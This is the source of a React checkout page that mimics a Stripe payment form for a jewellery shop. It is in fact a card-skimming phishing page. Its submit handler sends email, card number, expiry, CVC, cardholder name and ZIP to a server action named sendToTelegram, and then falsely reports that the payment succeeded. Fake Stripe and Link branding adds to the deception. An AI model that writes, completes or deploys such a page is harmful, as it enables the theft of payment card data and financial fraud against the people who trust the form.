"use client"

import { useState, type FormEvent } from "react"
import Image from "next/image"
import { ArrowLeft, Lock } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Checkbox } from "@/components/ui/checkbox"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { cn } from "@/lib/utils"
import { sendToTelegram } from "./app/actions/sendToTelegram"
import { useToast } from "@/components/ui/use-toast"

function validateCardNumber(number: string) {
  number = number.replace(/\D/g, "")
  if (number.length < 13 || number.length > 19) return false
  let sum = 0
  let isEven = false
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = Number.parseInt(number.charAt(i), 10)
    if (isEven) {
      digit *= 2
      if (digit > 9) {
        digit -= 9
      }
    }
    sum += digit
    isEven = !isEven
  }
  return sum % 10 === 0
}

export default function CheckoutPage() {
  const [isCardValid, setIsCardValid] = useState(true)
  const { toast } = useToast()

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault()
    const formData = new FormData(event.currentTarget)
    const result = await sendToTelegram(formData)

    if (result.success) {
      toast({
        title: "Payment Successful",
        description: "Your payment has been processed successfully.",
      })
    } else {
      toast({
        title: "Payment Failed",
        description: "There was an error processing your payment. Please try again.",
        variant: "destructive",
      })
    }
  }

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center">
      <div className="max-w-[480px] w-full mx-auto p-6 bg-white rounded-xl shadow-lg">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-3">
            <Button variant="ghost" size="icon" className="rounded-full">
              <ArrowLeft className="h-4 w-4" />
            </Button>
            <div className="flex items-center gap-2">
              <Image
                src="/placeholder.svg?height=20&width=20"
                alt="LUXE JEWELRY SECRET PTY LTD"
                width={20}
                height={20}
                className="h-5 w-5 rounded"
              />
              <span className="text-sm font-medium">LUXE JEWELRY SECRET PTY LTD</span>
            </div>
          </div>
          <div className="flex items-center gap-2 text-gray-400">
            <Image
              src="/placeholder.svg?height=20&width=60"
              alt="Stripe"
              width={60}
              height={20}
              className="h-5 w-auto"
            />
          </div>
        </div>

        {/* Product Info */}
        <div className="mb-8">
          <div className="text-sm text-gray-600">P/N:PRK2</div>
          <div className="text-3xl font-semibold">$56.00</div>
        </div>

        {/* Payment Form */}
        <form className="space-y-6" onSubmit={handleSubmit}>
          <div className="space-y-2">
            <Label htmlFor="email">Email</Label>
            <Input
              type="email"
              id="email"
              name="email"
              defaultValue="JoshuaLHerrera@jourrapide.com"
              className="bg-white border-gray-300"
              required
            />
          </div>

          <div className="space-y-2">
            <Label>Card information</Label>
            <div className="space-y-2">
              <div className="relative">
                <Input
                  type="text"
                  placeholder="1234 1234 1234 1234"
                  name="cardNumber"
                  className={cn("bg-white border-gray-300", isCardValid ? "" : "border-red-500 focus:ring-red-500")}
                  onChange={(e) => {
                    const isValid = validateCardNumber(e.target.value)
                    setIsCardValid(isValid)
                  }}
                  required
                />
                <div className="absolute right-3 top-1/2 -translate-y-1/2 flex gap-1">
                  <Image
                    src="/placeholder.svg?height=20&width=36"
                    alt="Visa"
                    width={36}
                    height={20}
                    className="h-5 w-9 object-contain"
                  />
                  <Image
                    src="/placeholder.svg?height=20&width=36"
                    alt="Mastercard"
                    width={36}
                    height={20}
                    className="h-5 w-9 object-contain"
                  />
                  <Image
                    src="/placeholder.svg?height=20&width=36"
                    alt="American Express"
                    width={36}
                    height={20}
                    className="h-5 w-9 object-contain"
                  />
                  <Image
                    src="/placeholder.svg?height=20&width=36"
                    alt="Union Pay"
                    width={36}
                    height={20}
                    className="h-5 w-9 object-contain"
                  />
                </div>
              </div>
              <div className="grid grid-cols-2 gap-2">
                <Input type="text" placeholder="MM / YY" name="expiry" className="bg-white border-gray-300" required />
                <div className="relative">
                  <Input type="text" placeholder="CVC" name="cvc" className="bg-white border-gray-300" required />
                  <div className="absolute right-3 top-1/2 -translate-y-1/2">
                    <Image
                      src="/placeholder.svg?height=16&width=16"
                      alt="CVC"
                      width={16}
                      height={16}
                      className="h-4 w-4 opacity-50"
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="space-y-2">
            <Label htmlFor="name">Cardholder name</Label>
            <Input
              type="text"
              id="name"
              name="cardholderName"
              placeholder="Full name on card"
              className="bg-white border-gray-300"
              required
            />
          </div>

          <div className="space-y-2">
            <Label>Country or region</Label>
            <Select name="country" defaultValue="US">
              <SelectTrigger className="bg-white border-gray-300">
                <SelectValue placeholder="Select country" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="US">United States</SelectItem>
                <SelectItem value="CA">Canada</SelectItem>
                <SelectItem value="GB">United Kingdom</SelectItem>
              </SelectContent>
            </Select>
            <Input type="text" placeholder="ZIP" name="zip" className="bg-white border-gray-300" required />
          </div>

          <div className="flex items-start gap-2">
            <Checkbox id="save" name="saveInfo" className="mt-1" />
            <div>
              <Label htmlFor="save" className="font-normal">
                Securely save my information for 1-click checkout
              </Label>
              <p className="text-sm text-gray-500">
                Pay faster on LUXE JEWELRY SECRET PTY LTD and everywhere Link is accepted.
              </p>
            </div>
          </div>

          <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white" size="lg">
            <Lock className="w-4 h-4 mr-2" />
            Pay $56.00
          </Button>

          <p className="text-xs text-gray-500 text-center">
            By clicking "Pay $56.00", you agree to the{" "}
            <a href="#" className="underline">
              Terms of Service
            </a>{" "}
            and{" "}
            <a href="#" className="underline">
              Privacy Policy
            </a>
            .
          </p>

          <div className="flex items-center gap-2 border rounded-lg p-4 bg-green-50 border-green-200">
            <div className="h-5 w-5 bg-green-100 rounded-full flex items-center justify-center">
              <div className="h-3 w-3 bg-green-500 rounded-full" />
            </div>
            <p className="text-sm text-green-800">
              <span className="font-medium">LUXE JEWELRY SECRET PTY LTD</span> will contribute{" "}
              <span className="font-medium">0.5% of your purchase</span> to removing CO<sub>2</sub> from the atmosphere.
            </p>
          </div>

          <div className="flex items-center justify-between text-xs text-gray-500">
            <div className="flex items-center gap-2">
              <span>Powered by</span>
              <Image
                src="/placeholder.svg?height=20&width=60"
                alt="Stripe"
                width={60}
                height={20}
                className="h-4 w-auto"
              />
            </div>
            <div className="flex gap-4">
              <a href="#" className="hover:text-gray-600">
                Terms
              </a>
              <a href="#" className="hover:text-gray-600">
                Privacy
              </a>
            </div>
          </div>
        </form>
      </div>
    </div>
  )
}

